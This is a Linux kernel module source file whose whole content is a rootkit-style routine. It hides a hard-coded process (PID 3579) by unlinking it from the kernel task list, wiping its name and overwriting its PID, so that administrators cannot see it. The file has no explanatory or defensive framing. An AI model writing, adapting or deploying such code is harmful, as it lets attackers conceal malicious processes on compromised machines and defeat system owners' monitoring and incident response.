#include <linux/module.h>
#include <linux/printk.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <net/sock.h>
#include <linux/proc_fs.h>
#include <linux/pid_namespace.h>
#include <linux/pid.h>
// #include <linux/pidfs.h>

#define HIDEPID 3579


extern struct pid* alloc_pid(struct pid_namespace *, pid_t*, size_t);

int hide_pid(void);




int init_module(void)
{
    hide_pid();
    return 0;
}


int hide_pid(void)
{
    struct list_head* pos = NULL;
    struct task_struct *task = NULL, *elected_task = NULL, *task_prev = NULL, *task_next = NULL;
    char new_comm[16] = {0};

    int target_pid = HIDEPID;

    printk(KERN_INFO "Target PID is %d", target_pid);
    list_for_each(pos, &current->tasks) {

        task = list_entry(pos, struct task_struct, tasks); 
        if(task->pid == target_pid) {
            elected_task = task;
        }
    }

    if(elected_task!=NULL) {

        printk(KERN_INFO "Process id is %d", elected_task->pid);

        task_next = list_entry(elected_task->tasks.next, struct task_struct, tasks);
        task_prev = list_entry(elected_task->tasks.prev, struct task_struct, tasks);
        printk(KERN_INFO "Next process is %s", task_next->comm);
        printk(KERN_INFO "Prev process is %s", task_prev->comm);

        memcpy(elected_task->comm, new_comm, 16);
    
        task_prev->tasks.next = elected_task->tasks.next;
        task_next->tasks.prev = elected_task->tasks.prev;

        elected_task->tasks.next = &(elected_task->tasks);
        elected_task->tasks.prev = &(elected_task->tasks);

        struct pid* pid = get_task_pid(elected_task, PIDTYPE_PID);
        struct pid* pid_next = get_task_pid(task_next, PIDTYPE_PID);
        if (pid != NULL && pid_next != NULL)
        {
            pid->numbers[0].nr = pid_next->numbers[0].nr;
        }
    }

    return 0;
}


void cleanup_module(void)
{
    printk(KERN_INFO "Finish work\n");
}


MODULE_LICENSE("GPL");
